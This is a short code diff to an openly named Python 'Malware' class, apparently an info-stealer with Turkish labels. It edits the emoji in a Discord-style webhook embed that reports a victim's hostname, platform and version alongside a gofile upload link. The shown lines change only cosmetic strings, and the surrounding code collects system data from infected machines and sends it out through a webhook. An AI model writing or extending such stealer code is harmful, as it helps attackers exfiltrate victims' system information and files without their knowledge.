@@ -84,7 +84,7 @@ class Malware:
     def send_webhook(self, gofile_url=None, file_path=None):
         try:
             embed = {
-                "title": ":red_crown1: Basit sistem bilgileri:",
+                "title": "<a:pinkcrown:996004209667346442> Basit sistem bilgileri:",
                 "color": 0xE53935,
                 "fields": [
                     {"name": "Ana makine adı:", "value": f"```{socket.gethostname()}```", "inline": True},
@@ -95,7 +95,7 @@ class Malware:
                     {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
                 ],
                 "footer": {
-                    "text": ":Rem: Im returning by death. | @Croxlv"
+                    "text": "<:Rem:> Im returning by death. | @Croxlv"
                 }
             }
 
